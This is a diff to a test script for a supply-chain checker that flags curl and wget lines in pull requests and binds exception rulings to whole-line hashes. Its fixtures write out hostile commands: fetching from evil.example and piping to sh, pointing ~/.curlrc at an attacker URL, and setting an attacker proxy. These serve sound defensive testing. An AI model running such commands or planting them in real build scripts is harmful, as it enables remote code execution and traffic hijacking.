@@ -899,7 +899,8 @@ assert len(imgs(cs)) == 3, imgs(cs)           # container:, services: and uses: 
 PY
 
 # --- REQ-SUP-001-AC16: ruled text lines. The scan stays strict (a line that only MENTIONS curl or wget is an unmeasured download); the BASE branch's
-# exceptions file lists such lines under unmeasured_text: {file, form, key (the scan's 16-hex line hash), ruling[, count]}. A matching row reports the item
+# exceptions file lists such lines under unmeasured_text: {file, form, key (the scan's 16-hex hash of the downloader segment), line (the 16-hex hash of the
+# WHOLE flattened line the segment sits in), ruling[, count]}. A matching row reports the item
 # as ruled text; no row, a wrong hash (an edited line), a row on the pull request's side only, or more occurrences than the row counts fail as before;
 # a malformed list stops the check (exit 2), never "nothing exempted" and never "everything exempted". -------------------------------------------------------
 rtext=$'#!/bin/sh\n# the stub replaces curl and wget on PATH (text, not a command)\necho "run wget https://example.invalid/x later"\n'
@@ -912,7 +913,19 @@ import importlib.util, json, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
 repo, out, mode = sys.argv[2:5]
 added = ac._added_unmeasured(repo, "HEAD~1", "HEAD")
-rows = [{"file": f, "form": w, "key": k.split(":", 1)[0], "ruling": "text, not a command: a test line"} for f, w, k in added]
+import hashlib, re, subprocess
+H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
+def lines_for(f, kh):   # an independent oracle: the whole flattened lines (as the scan flattens them) that hold a segment, or are a line, hashing to kh
+    text = subprocess.run(["git", "-C", repo, "show", "HEAD:" + f], capture_output=True, text=True, check=True).stdout
+    out = []
+    for line in re.sub(r"\\\n\s*", " ", text).split("\n"):
+        flat = " ".join(line.split())
+        if flat and (H(flat) == kh or any(H(s) == kh for s in re.split(r"\s*(?:;|&&|\|\||\|)\s*", flat))) and H(flat) not in out:
+            out.append(H(flat))
+    return out
+rows = [{"file": f, "form": w, "key": k.split(":", 1)[0], "line": lh, "ruling": "text, not a command: a test line"} for f, w, k in added for lh in lines_for(f, k.split(":", 1)[0])]
+assert len(rows) >= len(added), (rows, added)
+raw = None
 d = {"_format": "t", "exceptions": []}
 if mode == "all": pass
 elif mode == "first": rows = rows[:1]
@@ -930,7 +943,14 @@ elif mode == "fullkey": rows[0]["key"] = added[0][2]
 elif mode == "upperkey": rows[0]["key"] = rows[0]["key"].upper()
 elif mode == "dup": rows = rows + rows[:1]
 elif mode == "extra": rows[0]["note"] = "x"
-elif mode == "notdict": rows[0] = [rows[0]["file"], rows[0]["form"], rows[0]["key"], rows[0]["ruling"]]
+elif mode == "notdict": rows[0] = [rows[0]["file"], rows[0]["form"], rows[0]["key"], rows[0]["line"], rows[0]["ruling"]]
+elif mode == "noline": del rows[0]["line"]
+elif mode == "intline": rows[0]["line"] = 7
+elif mode == "shortline": rows[0]["line"] = rows[0]["line"][:15]
+elif mode == "upperline": rows[0]["line"] = rows[0]["line"].upper()
+elif mode == "wrongline": rows[0]["line"] = ("0" if rows[0]["line"][0] != "0" else "1") + rows[0]["line"][1:]
+elif mode == "dupjsonkey": raw = '{"exceptions": [], "unmeasured_text": [], "unmeasured_text": ' + json.dumps(rows) + '}'
+elif mode == "duprowkey": raw = '{"exceptions": [], "unmeasured_text": [' + json.dumps(rows[0])[:-1] + ', "ruling": "text, not a command: another ruling"}' + "".join(", " + json.dumps(r) for r in rows[1:]) + ']}'
 elif mode == "count0": rows[0]["count"] = 0
 elif mode == "countbool": rows[0]["count"] = True
 elif mode == "countstr": rows[0]["count"] = "2"
@@ -940,7 +960,10 @@ elif mode == "notlist": rows = {"rows": rows}
 elif mode == "emptyfile": rows[0]["file"] = ""
 else: raise SystemExit("unknown mode " + mode)
 d["unmeasured_text"] = rows
-json.dump(d, open(out, "w"), indent=2)
+if raw is not None:
+    open(out, "w").write(raw)
+else:
+    json.dump(d, open(out, "w"), indent=2)
 PY
 }
 rtck() { # REPO MODE [extra args] -> rc, $work/rt.out
@@ -970,12 +993,15 @@ check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")"
 for m in wrongfile wrongform; do rtck rt $m
 CASE="AC16: a row with the right hash but the wrong ${m#wrong} does not apply: both items fail (exit 1)"
 check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2; done
+rtck rt wrongline
+CASE="AC16: a row whose WHOLE-line hash does not match (one hex digit changed) does not apply: that item fails (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1
 rtrows "$work/rt" "$work/rt-orig.json" all
 newcase rtedit "$(pyw bin/ruled.sh "${rtext/later/soon}")"
 rc=0; python3 "$chk" --root "$work/rtedit" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/rt-orig.json" >"$work/rt.out" 2>&1 || rc=$?
 CASE="AC16: editing a ruled line voids its row (the hash changes): the edited line fails (exit 1), the unchanged one stays ruled"
 check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
-for m in emptyruling spaceruling noruling nokey intkey shortkey fullkey upperkey dup extra notdict count0 countbool countstr notlist emptyfile; do rtck rt $m
+for m in emptyruling spaceruling noruling nokey intkey shortkey fullkey upperkey dup extra notdict count0 countbool countstr notlist emptyfile noline intline shortline upperline dupjsonkey duprowkey; do rtck rt $m
 CASE="AC16: a malformed unmeasured_text ($m) stops the check fail-closed: exit 2, names the list, and is never a pass"
 check test "$rc" -eq 2; check grep -q 'unmeasured_text' "$work/rt.out"; check grep -qi 'not a pass' "$work/rt.out"; done
 printf '{"exceptions": [], "unmeasured_text": [' >"$work/rt-badjson.json"; rc=0
@@ -1000,6 +1026,47 @@ check test "$rc" -eq 1
 rtck rt2 count2
 CASE="AC16: count 2 on lines added twice passes (exit 0)"
 check test "$rc" -eq 0
+# the row is bound to the WHOLE line, not to the one downloader segment it hashes (Sonnet, PR 273 round 1): the line from pull request 271
+# (bin/build-helpers-test.sh:46) whose middle segment is "\n curl -s https://evil.example/x"; that segment inside ANY other line is not ruled
+cat >"$work/sx-ruled.txt" <<'EOF'
+    same-step) printf '  - runs: |\n      curl -s https://evil.example/x | sh\n' | tee -a "$work/gr/a.yaml" >>"$work/gr/b.yaml";;
+EOF
+cat >"$work/sx-attack.txt" <<'EOF'
+echo 'url = https://attacker.example/payload.sh' > ~/.curlrc
+export https_proxy=http://attacker.example:3128
+echo $'x|\n      curl -s https://evil.example/x |y' | sh
+EOF
+cat >"$work/sx-other.txt" <<'EOF'
+echo 'a|\n      curl -s https://evil.example/x|b' | bash
+EOF
+newcase sx "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-ruled.txt")")"
+rtrows "$work/sx" "$work/rt-sx.json" all
+sxck() { rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/rt-sx.json" >"$work/rt.out" 2>&1 || rc=$?; }
+sxck sx
+CASE="AC16 (whole line): the ruled line itself, with its row (segment hash and whole-line hash), passes (exit 0)"
+check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
+newcase sxa "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-attack.txt")")"
+sxck sxa
+CASE="AC16 (whole line): the Sonnet reproduction (the ruled segment embedded in another line that pipes to sh, next to a .curlrc and a proxy) FAILS (exit 1): not ruled"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/build-helpers-test.sh' "$work/rt.out"; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
+newcase sxo "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-other.txt")")"
+sxck sxo
+CASE="AC16 (whole line): the same segment with different surrounding text in another line FAILS (exit 1)"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
+newcase sxboth "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-ruled.txt" "$work/sx-attack.txt")")"
+sxck sxboth
+CASE="AC16 (whole line): the ruled line AND the segment hidden in another line in one file: the item FAILS (exit 1), the ruled line lends nothing"
+check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
+for edit in 's/b\.yaml/c.yaml/' 's/same-step/same-stop/' 's/tee -a/tee/' 's/- runs/- run/'; do
+  newcase sxe "$(pyw bin/build-helpers-test.sh "$(sed "$edit" "$work/sx-ruled.txt")")"
+  sxck sxe
+  CASE="AC16 (whole line): editing ANY part of the ruled line, even outside the downloader segment ($edit), voids its row: exit 1"
+  check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
+done
+newcase sxm "$(pyw bin/other-test.sh "$(cat "$work/sx-ruled.txt")")"
+sxck sxm
+CASE="AC16 (whole line): the ruled line moved to another file is not ruled: exit 1"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/other-test.sh' "$work/rt.out"
 # a row the PULL REQUEST brings does nothing: the rulings are read from the base branch (the trusted checkout the script runs from), never from --root
 rtrows "$work/rt" "$work/rt-head.json" all
 newcase rthead "$(pyw bin/ruled.sh "$rtext")"$'\n'"import shutil; shutil.copy('$work/rt-head.json', '.github/supply-chain-exceptions.json')"
@@ -1018,7 +1085,7 @@ import importlib.util, os, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
 assert os.path.realpath(ac.DEFAULT_EXCEPTIONS) == os.path.realpath(os.path.join(sys.argv[2], ".github", "supply-chain-exceptions.json")), ac.DEFAULT_EXCEPTIONS
 PY
-CASE="AC16: the committed unmeasured_text rows load, and each has exactly file, form, key (16 lowercase hex), a 'text, not a command:' ruling and no duplicate"
+CASE="AC16: the committed unmeasured_text rows load, and each has exactly file, form, key and line (16 lowercase hex each), a 'text, not a command:' ruling and no duplicate"
 check python3 - "$chk" "$root/.github/supply-chain-exceptions.json" <<'PY'
 import importlib.util, json, re, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
@@ -1027,7 +1094,8 @@ loaded = ac.load_ruled_text(sys.argv[2], required=True)
 assert rows and len(loaded) == len(rows), (len(rows), len(loaded))
 forms = {"a download"} | {w for _, w in ac.inv._UNMEASURED}
 for r in rows:
-    assert set(r) == {"file", "form", "key", "ruling"}, r
+    assert set(r) == {"file", "form", "key", "line", "ruling"}, r
+    assert re.fullmatch(r"[0-9a-f]{16}", r["line"]), r
     assert r["file"] and not r["file"].startswith((".github/agent/", "/")) and r["form"] in forms, r
     assert re.fullmatch(r"[0-9a-f]{16}", r["key"]) and r["ruling"].startswith("text, not a command: ") and len(r["ruling"]) > len("text, not a command: ") + 10, r
 PY
